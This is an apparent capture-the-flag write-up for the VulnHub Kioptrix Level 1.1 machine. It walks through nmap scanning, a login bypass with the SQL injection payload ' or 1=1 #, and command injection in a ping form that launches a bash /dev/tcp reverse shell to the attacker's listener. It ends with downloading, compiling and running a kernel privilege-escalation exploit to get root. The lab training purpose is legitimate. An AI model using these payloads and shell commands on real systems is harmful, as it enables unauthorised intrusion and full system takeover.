<img width="687" height="323" alt="image" src="https://github.com/user-attachments/assets/c788d51e-a014-4aa3-a108-8449f5bbfc9e" />

# VulnHub Write-Up - Kioptrix-Level-1.1 (#2)

> **Machine Name:** Kioptrix-Level-1.1 (#2)
>
> **Machine URL:** https://www.vulnhub.com/entry/kioptrix-level-11-2,23
>
> **Difficulty:** Easy
>
> **OS:** Linux
>
> **Date:** 20-Dec-2025
>
> **Author:** Ahmed Abd Elghany (0xAhmedITO)

---

> **Machine About**
>
> This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.

---

## Super Note

It's important to have your own strategy of testing/playing, regardless of the machine's difficulty.

---

# 🔍 1) Recon & Enumeration

## Network Discovery
### Commands
```bash
┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L2]
└─$ sudo nmap -e eth1 -sn 192.168.11.0/24 -oN network_discovery
```
### Raw Results:
```markdown
┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L2]
└─$ sudo nmap -e eth1 -sn 192.168.11.0/24 -oN network_discovery
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-20 10:50 -0500
Nmap scan report for 192.168.11.1
Host is up (0.00034s latency).
MAC Address: 00:50:56:C0:00:01 (VMware)
Nmap scan report for 192.168.11.102
Host is up (0.00027s latency).
MAC Address: 00:0C:29:23:B2:26 (VMware)
Nmap scan report for 192.168.11.120
Host is up (0.00031s latency).
MAC Address: 00:50:56:FD:A9:14 (VMware)
Nmap done: 256 IP addresses (3 hosts up) scanned in 6.45 seconds
```

### Result Summary:

| IP             | Status | Method (ICMP/ARP/TCP) | Hostname | Notes            | Next Action |
| -------------- | ------ | --------------------- | -------- | ---------------- | ----------- |
| 192.168.11.1   | Up     | ICMP                  |          | Gateway          |             |
| 192.168.11.102 | Up     | ICMP                  |          | Potential Target | Port scan   |
| 192.168.11.120 | Up     | ICMP                  |          | Other device on my machine    |             |

The target IP is **192.168.11.102**, let's scan it.

---

## Port Scanning Results
**Goal:** Identify open ports & exposed services
**Output Files:** `full_scan_192.168.11.102`
### Used Commands
```bash
sudo nmap -p- -sS -sV 192.168.11.102 -oN full_scan_192.168.11.102
```
### Raw Results
```markdown
└─$ sudo nmap -p- -sS -sV 192.168.11.102 -oN full_scan_192.168.11.102 
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-20 10:56 -0500
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 21.47% done; ETC: 10:56 (0:00:04 remaining)
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 59.25% done; ETC: 10:56 (0:00:03 remaining)
Nmap scan report for 192.168.11.102
Host is up (0.0017s latency).
Not shown: 65528 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind  2 (RPC #100000)
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
631/tcp  open  ipp      CUPS 1.1
903/tcp  open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:23:B2:26 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.96 seconds
```

### Ports Summary:

| Port | Service  | Version / Info                 | Notes | Next Action |
| ---- | -------- | ------------------------------ | ----- | ----------- |
| 22   | ssh      | OpenSSH 3.9p1 (protocol 1.99)  |       | Service Enum/Version Searchsploit |
| 80   | http     | Apache httpd 2.0.52 ((CentOS)) |       | Service Enum/Version Searchsploit |
| 111  | rpcbind  | 2 (RPC #100000)                |       | Service Enum |
| 443  | ssl/http | Apache httpd 2.0.52 ((CentOS)) |       | Service Enum/Version Searchsploit |
| 631  | ipp      | CUPS 1.1                       |       | Service Enum |
| 903  | status   | 1 (RPC #100024)                |       | Service Enum |
| 3306 | mysql    | MySQL (unauthorized)           |       | Service Enum |

In order to get a full vision, it is a must to enumerate each service deeply, i did that on my own note, and the below one is the working attack vector.

---

## Specific Services Enumeration

### Port/Service :  80:http , 443:ssl/http

- **Service:** HTTP and HTTPS
- **Port:** 80 and 443
- **Protocol:** HTTP and HTTPS
- **Goal:** Extract creds / paths / users / vuln leads
  
#### Used Commands/Strategy

- Manual Enumeration by browsing http://192.168.11.102 

#### Findings

- Login page
- <img width="899" height="276" alt="image" src="https://github.com/user-attachments/assets/c771d259-12f1-4a78-9223-7cad77f34e38" />


#### Exploitation Leads

- SQLi
- Brute Force / Password Attacks
- Username Enumeration

Performed SQLi and it worked with the classic payload with the below details.

---

# 2) Exploitation

## Exploit Attempt:
- Service/Vector: Login Page
- Exploits: SQLi & Command Injection
- Source: http://192.168.11.102
- Payload: `' or 1=1 #`

The SQL injection was performed at the web application level and not directly against the MySQL service (3306).

### Action

- Payload: `' or 1=1 #'
  <img width="898" height="286" alt="image" src="https://github.com/user-attachments/assets/3b879cd9-9aad-4db1-825c-172e87e52fa4" />


### Result

- Logged in successfully
  <img width="894" height="214" alt="image" src="https://github.com/user-attachments/assets/3769dcf3-1811-4f88-9517-8a7280e82941" />


### Next Action

- This page is accepting URLs and then returning a ping result.
  I tried my IP and got the below:
  <img width="900" height="314" alt="image" src="https://github.com/user-attachments/assets/a8623608-08e9-401c-9ed0-584730f78e78" />
- This result similar to terminal results. so our next action to to try to inject a command, we can try **pwd**, i used **semicolon** to make sure seprating the server behavoiur and my command.
- Payload: `; pwd`
  <img width="894" height="222" alt="image" src="https://github.com/user-attachments/assets/06114848-5e3d-44d1-89da-1f3e709b8a2a" />
- It's working, now time to remote the server by perfroming reverse shell, ref#1 cheat sheet has many ways to achieve this, i used the below:
  ```bash
  /bin/bash -i >& /dev/tcp/192.168.11.100/4444 0>&1
  ```
- On my machine:
  ```bash
  ┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L2]
  └─$ nc -nlvp 4444            
  listening on [any] 4444 ...
  ```
- Then inject this command into the ping input.
  `; /bin/bash -i >& /dev/tcp/192.168.11.100/4444 0>&1`
- Click Enter, then got the remote connection!
  <img width="1371" height="565" alt="Level 1 1 (2)-4" src="https://github.com/user-attachments/assets/634c37a8-8847-45e0-97d3-4f464faadc77" />

We are inside the server! Next action is to escalate the user privilege.

---

## 3) Privilege Escalation

## Enumeration
**Goal**: Identify privilege escalation vectors
**Tools**: manual

### Commands for Manual Enumeration

```bash
bash-3.00$ whoami
apache
bash-3.00$ id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-3.00$ uname -a
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux
bash-3.00$ lsb_release -a
LSB Version:    :core-3.0-ia32:core-3.0-noarch:graphics-3.0-ia32:graphics-3.0-noarch
Distributor ID: CentOS
Description:    CentOS release 4.5 (Final)
Release:        4.5
Codename:       Final
```

### Findings
```markdown
	- Kernel version: 2.6.9-55
	- CentOS release 4.5 (Final)
```

searchsploit for this version:

```bash
┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L2]
└─$ searchsploit Kernel 2.6 CentOS Privilege
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/1 | linux/local/9545.c
Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4  | linux/local/9479.c
Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4 | linux_x86/local/9542.c
Linux Kernel 2.6.32 < 3.x (CentOS 5/6) - 'PERF_EVENTS' Local Privilege  | linux/local/25444.c
Linux Kernel 2.6.x / 3.10.x / 4.14.x (RedHat / Debian / CentOS) (x64) - | linux_x86-64/local/45516.c
------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
```

This exploit looks matching: Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4  | linux/local/9479.c

### Exploit Process

I have downladed the exploit, then activated my web server that i will use to downlaod the exploit on the target machine, after download i compiled the exploit and executed with a result of root access.

Full steps are below:

On my machine:
```bash
┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L2]
└─$ searchsploit -m linux/local/9479.c
  Exploit: Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Ring0 Privilege Escalation (5)
      URL: https://www.exploit-db.com/exploits/9479
     Path: /usr/share/exploitdb/exploits/linux/local/9479.c
    Codes: CVE-2009-2692, OSVDB-56992
 Verified: True
File Type: C source, ASCII text
Copied to: /home/kali/Desktop/Labs_Notes/VulnHub/Kioptrix_L2/9479.c
    
┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L2]
└─$ ls
9479.c  full_scan_192.168.11.102  network_discovery
  
┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L2]
└─$ mv 9479.c prev_esc_orig.c 

┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L2]
└─$ sudo cp prev_esc_orig.c /var/www/html/file
```

On target machine:
```bash
bash-3.00$ cd /tmp
bash-3.00$ wget http://192.168.11.100/file/prev_esc_orig.c
--11:53:44--  http://192.168.11.100/file/prev_esc_orig.c
           => `prev_esc_orig.c'
Connecting to 192.168.11.100:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2,535 (2.5K) [text/x-csrc]

    0K ..                                                    100%  185.97 MB/s

11:53:44 (185.97 MB/s) - `prev_esc_orig.c' saved [2535/2535]

bash-3.00$ ls
prev_esc_orig.c
bash-3.00$ gcc -o prev_esc_exp_01 prev_esc_orig.c
bash-3.00$ ./prev_esc_exp_01
sh: no job control in this shell
sh-3.00# whoami
root
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
```

Perfect! we have the **root** privilege.

<img width="1406" height="619" alt="Level 1 1 (2)-5" src="https://github.com/user-attachments/assets/7eb203de-d42a-4534-95d2-582dfd7adee7" />

---

# 🏁 4) Proof & Flags
Proof Files:

- User Access:
  <img width="1371" height="565" alt="Level 1 1 (2)-4" src="https://github.com/user-attachments/assets/634c37a8-8847-45e0-97d3-4f464faadc77" />

- Root Access:
  <img width="1406" height="619" alt="Level 1 1 (2)-5" src="https://github.com/user-attachments/assets/7eb203de-d42a-4534-95d2-582dfd7adee7" />

---

# 🔗 References

- **ref#1**: https://www.invicti.com/learn/reverse-shell

---
